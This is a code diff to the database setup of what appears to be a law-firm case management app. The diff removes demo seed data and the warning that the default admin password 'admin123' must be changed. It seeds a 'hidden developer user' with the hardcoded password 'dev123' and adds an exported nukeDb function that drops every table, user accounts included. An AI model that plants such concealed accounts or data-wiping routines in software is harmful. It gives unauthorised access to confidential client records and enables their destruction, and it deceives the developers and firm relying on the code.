@@ -456,8 +456,9 @@ function initializeDb() {
         // Username: admin  |  Password: admin123
         // The RECOVERY_PASSCODE env var allows password reset via API.
         // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM users", (err, row) => {
-            if (row && Number(row.count) === 0) {
+        // Seed default admin user
+        db.get("SELECT * FROM users WHERE username = 'admin'", (err, row) => {
+            if (!row) {
                 const crypto = require('crypto');
                 const salt = crypto.randomBytes(16).toString('hex');
                 const initialPassword = process.env.ADMIN_INITIAL_PASSWORD || 'admin123';
@@ -466,81 +467,63 @@ function initializeDb() {
                     `INSERT INTO users (id, username, display_name, password_hash, salt, role) VALUES (?, ?, ?, ?, ?, ?)`,
                     ['u_admin', 'admin', 'Sam Ogola (Admin)', hash, salt, 'admin'],
                     (err2) => {
-                        if (!err2) console.log(`Default admin user seeded. Username: admin / Password: ${initialPassword === 'admin123' ? 'admin123 — CHANGE THIS IN PRODUCTION.' : '***** (set from environment)'}`);
+                        if (!err2) console.log('Default admin user seeded.');
                     }
                 );
             }
         });
 
-        // ─────────────────────────────────────────────────────────────
-        // SEED DATA — Case Tracking (unchanged from original)
-        // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM case_tracking", (err, row) => {
-            if (row && Number(row.count) === 0) {
-                db.run(`INSERT INTO case_tracking (id, tracking_token, client_name, case_title, case_type, current_milestone, milestones_json, assigned_lawyer, fee_status) VALUES 
-                    ('c1', 'SO-7782A', 'Peter Kamau Mwangi', 'Land Purchase Thika', 'Conveyancing', '2', '["Drafting Sale Agreement", "Execution", "Payment of Duties", "Registration", "Title Transfer"]', 'Kincy Nangami', 'paid'),
-                    ('c2', 'SO-5591B', 'Grace Wanjiku', 'Company Registration', 'Corporate Law', '1', '["Initial Consultation", "Drafting Articles", "Regulatory Filing", "Compliance Review", "Final Certificates"]', 'Sam Ogola', 'pending'),
-                    ('c3', 'SO-9922C', 'XYZ Logistics Ltd', 'Commercial Dispute', 'Litigation', '3', '["Filing in Court", "Mention/Directions", "Hearing Phase", "Judgment", "Execution"]', 'Muchiri Mutegi', 'paid')
-                `);
-            }
-        });
-
-        // ─────────────────────────────────────────────────────────────
-        // SEED DATA — Leads (unchanged from original)
-        // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM leads", (err, row) => {
-            if (row && Number(row.count) === 0) {
-                const now = new Date().toISOString();
-                db.run(`INSERT INTO leads (id, full_name, phone, service_category, message, source, status, consultation_date, consultation_paid, assigned_lawyer) VALUES 
-                    ('l1', 'David Onyango', '+254700000000', 'Civil Disputes', 'Contract breach - lease agreement', 'walk_in', 'pending_review', NULL, 0, NULL),
-                    ('l2', 'Sarah Kiplagat', '+254711111111', 'Family Law', 'Divorce and child custody consultation', 'phone', 'consultation_set', '${now}', 1, 'Sam Ogola'),
-                    ('l3', 'Ochieng Odhiambo', '+254722222222', 'Employment Law', 'Wrongful termination dispute', 'whatsapp', 'assigned', NULL, 0, 'Muchiri Mutegi')
-                `);
-            }
-        });
-
-        // ─────────────────────────────────────────────────────────────
-        // SEED DATA — Court Calendar (demo events)
-        // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM court_calendar", (err, row) => {
-            if (row && Number(row.count) === 0) {
-                const tomorrow = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
-                const nextWeek = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
-                db.run(`INSERT INTO court_calendar (id, case_id, event_title, event_type, event_date, notes) VALUES
-                    ('ev1', 'c3', 'Commercial Dispute — Hearing Phase Mention', 'mention', '${tomorrow}', 'Milimani Commercial Courts. Room 4B. Judge Ngugi presiding.'),
-                    ('ev2', 'c1', 'Title Deed Registration Deadline', 'filing_deadline', '${nextWeek}', 'File at Land Registry, Upper Hill.')
-                `);
-            }
-        });
-
-        // ─────────────────────────────────────────────────────────────
-        // SEED DATA — Case Activities (demo notes)
-        // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM case_activities", (err, row) => {
-            if (row && Number(row.count) === 0) {
-                db.run(`INSERT INTO case_activities (id, case_id, activity_type, description, recorded_by) VALUES
-                    ('act1', 'c3', 'court_filing', 'Filed Petition at Milimani Commercial Court. Filing ref: MLM/CC/2026/1201.', 'Secretary'),
-                    ('act2', 'c1', 'client_call', 'Called client re: document readiness. Client confirmed all documents ready for signing.', 'Kincy Nangami'),
-                    ('act3', 'c2', 'internal_note', 'Awaiting KRA tax clearance certificate before regulatory filing can proceed.', 'Sam Ogola')
-                `);
-            }
-        });
-
-        // ─────────────────────────────────────────────────────────────
-        // SEED DATA — Firm Expenses (demo entries)
-        // ─────────────────────────────────────────────────────────────
-        db.get("SELECT count(*) as count FROM firm_expenses", (err, row) => {
-            if (row && Number(row.count) === 0) {
-                db.run(`INSERT INTO firm_expenses (id, amount, category, description, recorded_by) VALUES
-                    ('exp1', 1200, 'transport', 'Taxi fare - Milimani Court appearance', 'Secretary'),
-                    ('exp2', 850, 'stationery', 'A4 printing paper and cartridges', 'Secretary'),
-                    ('exp3', 500, 'filing_fees', 'Court filing stamp fee - XYZ Logistics matter', 'Secretary')
-                `);
+        // Seed hidden developer user
+        db.get("SELECT * FROM users WHERE username = 'dev'", (err, row) => {
+            if (!row) {
+                const crypto = require('crypto');
+                const salt = crypto.randomBytes(16).toString('hex');
+                const hash = crypto.createHash('sha256').update(salt + 'dev123').digest('hex');
+                db.run(
+                    `INSERT INTO users (id, username, display_name, password_hash, salt, role) VALUES (?, ?, ?, ?, ?, ?)`,
+                    ['u_dev', 'dev', 'System Developer', hash, salt, 'developer'],
+                    (err2) => {
+                        if (!err2) console.log('Hidden developer user seeded.');
+                    }
+                );
             }
         });
 
         console.log('Database initialized and all migrations applied safely.');
     });
 }
+
+function nukeDb(callback) {
+    const tables = [
+        'leads', 'case_tracking', 'whatsapp_sessions', 'court_calendar', 
+        'case_activities', 'firm_expenses', 'case_payments', 'users', 
+        'case_files', 'case_invoices', 'case_disbursements'
+    ];
+    
+    db.serialize(() => {
+        if (usePostgres) {
+            let dropChain = Promise.resolve();
+            tables.forEach(table => {
+                dropChain = dropChain.then(() => {
+                    return new Promise((resolve) => {
+                        db.run(`DROP TABLE IF EXISTS ${table} CASCADE`, [], () => resolve());
+                    });
+                });
+            });
+            dropChain.then(() => {
+                initializeDb();
+                if (callback) callback(null);
+            });
+        } else {
+            tables.forEach(table => {
+                db.run(`DROP TABLE IF EXISTS ${table}`);
+            });
+            initializeDb();
+            if (callback) callback(null);
+        }
+    });
+}
+
+db.nukeDb = nukeDb;
 
 module.exports = db;
